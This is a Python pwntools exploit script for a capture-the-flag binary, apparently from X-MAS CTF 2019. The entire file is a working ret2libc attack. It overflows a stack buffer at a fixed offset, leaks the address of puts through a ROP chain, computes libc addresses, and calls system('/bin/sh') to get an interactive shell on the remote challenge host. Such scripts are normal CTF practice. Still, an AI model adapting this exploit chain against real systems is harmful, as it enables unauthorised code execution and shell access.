#!/usr/bin/env python2

import sys
from pwn import *
import base64
from os import system
from ropper import RopperService

context.update(arch="amd64", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/xmas-htsp-2019/pwn/the-weather/oke")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    # attach(r)

    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    off = 424

    # r.recvuntil("Content: b'")
    # binary = r.recvline()
    # raw_bin = base64.b64decode(binary)
    # path = "tmp/ok"
    # f = open(path,'wb')
    # f.write(raw_bin)
    # f.close()
    # system("chmod 777 tmp/ok")
    # binf = ELF(path)

    binf = elf
    path = "oke"

    pop_rdi = 0x0000000000401db3
    # puts_got = 0x000000605018
    # puts_plt = 0x00000000004005c0 
    main = 0x0000000000401B15
    # main = elf.plt['main']
    puts_got = binf.got['puts']
    puts_plt = binf.plt['puts']

    rop = ROP(path)
    # print rop.raw(pop_rdi)

    p = "A" * off
    p += p64(pop_rdi)
    p += p64(puts_got)
    p += p64(puts_plt)
    p += p64(main)

    r.sendlineafter("? ",p)    


    r.recvuntil("bye!\n")
    leak = u64(r.recv().split()[0].ljust(8 , "\x00"))
    # leak = u64(r.recv(8).ljust(8,"\x00"))

    log.info("leak puts : " + hex(leak))

    libc_base = leak - libc.symbols['puts']
    systemlibc = libc_base + libc.symbols['system']
    binsh = libc_base + libc.search("/bin/sh").next()

    q = "A" * off
    q += p64(pop_rdi)
    q += p64(binsh)
    q += p64(0x00000000004005a6)
    q += p64(systemlibc)

    r.sendline(q)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("challs.xmas.htsp.ro", 12002)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
